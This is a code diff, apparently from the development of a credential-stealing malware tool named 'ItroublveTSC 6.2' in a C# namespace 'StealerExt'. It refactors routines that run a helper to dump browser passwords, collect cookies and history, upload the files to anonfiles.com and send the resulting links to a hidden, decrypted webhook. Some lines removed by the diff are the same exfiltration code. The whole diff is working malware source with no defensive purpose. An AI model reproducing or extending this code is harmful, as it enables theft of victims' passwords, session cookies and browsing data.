@@ -2,8 +2,6 @@
 using System.IO;
 using System.Net;
 using System.Net.Http;
-using System.Text;
-using System.Threading;
 
 namespace StealerExt
 {
@@ -39,32 +37,9 @@ namespace StealerExt
 			}
 			else
 			{
-				string history = string.Empty;
-				try
-				{
-					using (var Client = new ExtendedWebClient())
-					{
-						Client.Timeout = Timeout.Infinite;
-						Client.AllowWriteStreamBuffering = false;
-						byte[] Response = Client.UploadFile("https://api.anonfiles.com/upload", _history);
-						Client.Dispose();
-						string ResponseBody = Encoding.ASCII.GetString(Response);
-						if (ResponseBody.Contains("\"error\": {"))
-						{
-							history += "Error (History): " + ResponseBody.Split('"')[7] + "\r\n";
-						}
-						else
-						{
-							history += "Browser History: " + ResponseBody.Split('"')[15] + "\r\n";
-						}
-					}
-					new API(wHook).SendHistory(history);
-				}
-				catch (WebException ex)
-				{
-					history += "History ex (anonfiles): " + ex.Message + "\r\n";
-					new API(wHook).SendHistory(history);
-				}
+				string info = null;
+				UploadAnonFiles.UploadFile(_history, ref info);
+				new API(wHook).SendPasswords(info.Replace("{0}", nameof(History)));
 			}
 			File.Delete(_history);
         }
@@ -101,37 +76,14 @@ namespace StealerExt
 			}
             else
             {
-				string info = string.Empty;
-				try
-				{
-					using (var Client = new ExtendedWebClient())
-					{
-						Client.Timeout = Timeout.Infinite;
-						Client.AllowWriteStreamBuffering = false;
-						byte[] Response = Client.UploadFile("https://api.anonfiles.com/upload", text);
-						Client.Dispose();
-						string ResponseBody = Encoding.ASCII.GetString(Response);
-						if (ResponseBody.Contains("\"error\": {"))
-						{
-							info += "Error (Cookie): " + ResponseBody.Split('"')[7] + "\r\n";
-						}
-						else
-						{
-							info += "Browser Cookies: " + ResponseBody.Split('"')[15] + "\r\n";
-						}
-					}
-					new API(wHook).SendCookies(info);
-				}
-				catch (Exception ex)
-				{
-					info += "Cookies Exception [Anonfiles]: " + ex.Message + "\r\n";
-					new API(wHook).SendCookies(info);
-				}
+				string info = null;
+				UploadAnonFiles.UploadFile(text, ref info);
+                new API(wHook).SendCookies(info.Replace("{0}", nameof(Cookies)));
 			}
 			File.Delete(text);
 		}
-        
-		public static void Passwords()
+
+        public static void Passwords()
 		{
 			StartProcess.Run("snuvcdsm.exe", "Passwords");
 			string passwordLoc = Path.Combine(Temp + "Passwords.txt");
@@ -154,32 +106,9 @@ namespace StealerExt
 			}
             else
             {
-				string info = string.Empty;
-				try
-				{
-					using (var Client = new ExtendedWebClient())
-					{
-						Client.Timeout = Timeout.Infinite;
-						Client.AllowWriteStreamBuffering = false;
-						byte[] Response = Client.UploadFile("https://api.anonfiles.com/upload", passwordLoc);
-						Client.Dispose();
-						string ResponseBody = Encoding.ASCII.GetString(Response);
-						if (ResponseBody.Contains("\"error\": {"))
-						{
-							info += "Error (Passwords): " + ResponseBody.Split('"')[7] + "\r\n";
-						}
-						else
-						{
-							info += "Browser Passwords: " + ResponseBody.Split('"')[15] + "\r\n";
-						}
-					}
-					new API(wHook).SendPasswords(info);
-				}
-				catch (WebException ex)
-				{
-					info += "Passwords ex (anonfiles): " + ex.Message + "\r\n";
-					new API(wHook).SendPasswords(info);
-				}
+				string info = null;
+				UploadAnonFiles.UploadFile(passwordLoc, ref info);
+				new API(wHook).SendPasswords(info.Replace("{0}", nameof(Passwords)));
 			}
 			File.Delete(passwordLoc);
 		}
@@ -248,23 +177,7 @@ namespace StealerExt
 			return result.StatusCode == HttpStatusCode.NoContent;
 		}
 
-		public bool SendSysInfo(string content, string file = null)
-		{
-			MultipartFormDataContent multipartFormDataContent = new MultipartFormDataContent();
-			multipartFormDataContent.Add(new StringContent(name), "username");
-			multipartFormDataContent.Add(new StringContent(pfp), "avatar_url");
-			multipartFormDataContent.Add(new StringContent(content), "content");
-			bool flag = file != null;
-			if (flag)
-			{
-				byte[] content2 = File.ReadAllBytes(file);
-				multipartFormDataContent.Add(new ByteArrayContent(content2), "SystemINFO.txt", "SystemINFO.txt");
-			}
-			HttpResponseMessage result = _Client.PostAsync(_URL, multipartFormDataContent).Result;
-			return result.StatusCode == HttpStatusCode.NoContent;
-		}
-
-		public bool SendWCC(string content, string file = null)
+		public bool SendWCC(string content = null, string file = null)
 		{
 			MultipartFormDataContent multipartFormDataContent = new MultipartFormDataContent();
 			multipartFormDataContent.Add(new StringContent(name), "username");
@@ -294,39 +207,14 @@ namespace StealerExt
 			HttpResponseMessage result = _Client.PostAsync(_URL, multipartFormDataContent).Result;
 			return result.StatusCode == HttpStatusCode.NoContent;
 		}
-
-		public static bool FileInUse(FileInfo file)
-		{
-			FileStream stream = null;
-			if (file.Name.Contains("capture.png") & !file.Exists)
-			{
-				Thread.Sleep(1000);
-				if (!file.Exists)
-					return false;
-			}
-			try
-			{
-				stream = file.Open(FileMode.Open, FileAccess.ReadWrite, FileShare.None);
-			}
-			catch (IOException)
-			{
-				return true;
-			}
-			finally
-			{
-				if (stream != null)
-					stream.Close();
-			}
-			return false;
-		}
-
+        
         public static string wHook => Hook._DecryptedHook;
 		public const string name = "ItroublveTSC 6.2";
 		public const string pfp = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQaZLjMqLWHlL0VMxjLOEYXohyV6C9dsEjKsg&usqp=CAU";
 		private HttpClient _Client;
-		private string _URL;
-		public string _name { get; set; }
-		public string _ppUrl { get; set; }
+		private readonly string _URL;
+		//public string _name { get; set; }
+		//public string _ppUrl { get; set; }
 		public static WebClient wc = new WebClient();
 		public static string Temp = Path.GetTempPath();
 	}
